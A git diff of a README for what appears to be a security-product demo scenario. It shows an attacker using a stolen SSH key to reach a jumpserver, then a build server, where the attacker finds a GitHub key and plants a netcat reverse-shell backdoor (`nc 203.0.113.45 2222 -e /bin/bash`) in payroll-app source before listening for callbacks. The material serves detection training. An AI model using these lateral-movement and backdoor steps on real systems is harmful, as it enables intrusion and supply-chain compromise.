@@ -8,27 +8,12 @@ This scenario requires two machines to be set up outside of the Kubernetes clust
 
 ## Running the Exploit
 
-- ssh to the jumpserver
-
-```sh
-history
-ls ~/.ssh
-ssh -i ~/.ssh/buildbox_id root@buildbox
-```
-
-```sh
-history
-ls ~/payroll-app/
-cat payroll-app/Makefile
-ls ~/.ssh
-```
-
 There are two machines in this scenario: a "jumpserver" and a build server (`buildbox`). The build server is supposed to be restricted, and can only be accessed from machines within the same account. To use the build server for publishing new versions of private images, developers first connect to a public-facing jumpserver using SSH. From there, they can connect to the build server.
 
 In this scenario, we start as the attacker, who has just acquired the SSH key for the jumpserver. Let's start by connecting to the machine.
 
 ```sh
-ssh -i ~/path/to/jumpserver/key root@JUMPSERVER_IP
+ssh -i ~/path/to/jumpserver/key JUMPSERVER_USER@JUMPSERVER_IP
 ```
 
 Now, take a look at the history:
@@ -43,7 +28,7 @@ history
     4  ls .ssh/
     5  ssh-keygen
     6  cat .ssh/buildbox_id.pub 
-    7  ssh -i ~/.ssh/buildbox_id root@buildbox
+    7  ssh -i ~/.ssh/buildbox_id root@203.0.113.45
     8  history
 ```
 
@@ -53,13 +38,14 @@ The developers used the SSH key `buildbox_id` to access the build server. It als
 ls ~/.ssh
 ```
 ```
-authorized_keys  buildbox_id  known_hosts  known_hosts.old
+authorized_keys  buildbox_id
 ```
 
 So now, we can connect to the build server:
 
 ```sh
-ssh -i ~/.ssh/buildbox_id root@buildbox
+# note: use the command that appeared in your history for a valid user/IP
+ssh -i ~/.ssh/buildbox_id root@203.0.113.45
 ```
 
 If we look at the history, we can see some of the old packages that were built here:
@@ -87,7 +73,16 @@ history
    17  history
 ```
 
-From here, we can take a look at the `payroll-app` directory to get some more details about how the build were handled:
+Given the build server is fetching private code using SSH, we could use the SSH keys here to login to GitHub and view the company's repositories:
+
+```sh
+ls ~/.ssh/
+```
+```
+authorized_keys  github-login
+```
+
+Instead, let's can take a look at the `payroll-app` directory to get some more details about how the build were handled:
 
 ```sh
 ls ~/payroll-app/
@@ -96,21 +91,35 @@ ls ~/payroll-app/
 cat payroll-app/Makefile
 ```
 
-And, given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package. For example:
+And, given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package.
+
+As an example, let's could install netcat:
+
+```sh
+sudo yum install nmap-ncat
+```
+
+And validate that we can use `nc`:
+
+```sh
+nc --version
+```
+
+Then, we can edit the payroll app to give us the backdoor, such as connecting to this machine with a reverse shell.
 
 ```py
 # file: payroll-app/payroll-calc.py
 # ...
-import os; os.system("nc 203.0.113.45 443 -e /bin/bash")
+import os; os.system("nc 203.0.113.45 2222 -e /bin/bash")
 ```
 
-Given the build server is fetching private code using SSH, we can also use the SSH keys here to login to GitHub and view the company's repositories:
+For this demo, the buildbox is not actually set up to generate new images, but at this point is where we would build the new image, start a listening server, and wait for someone to deploy the backdoor:
 
 ```sh
-ls ~/.ssh/
+nc -l -p 2222
 ```
 
-For more detail, see the [supply chain attack demo](../supply_chain/README.md).
+To see a full supply-chain exploitation and how Spyderbat detects it, visit the [supply chain attack demo](../supply_chain/).
 
 ## Investigation
 
@@ -118,5 +127,5 @@ For more detail, see the [supply chain attack demo](../supply_chain/README.md).
 
 ## Further Reading
 
-- [Supply Chain Attack Scenario](../supply_chain/README.md)
-- [End-to-End Demo Scenario](../end_to_end/README.md)
+- [Supply Chain Attack Scenario](../supply_chain/)
+- [End-to-End Demo Scenario](../end_to_end/)
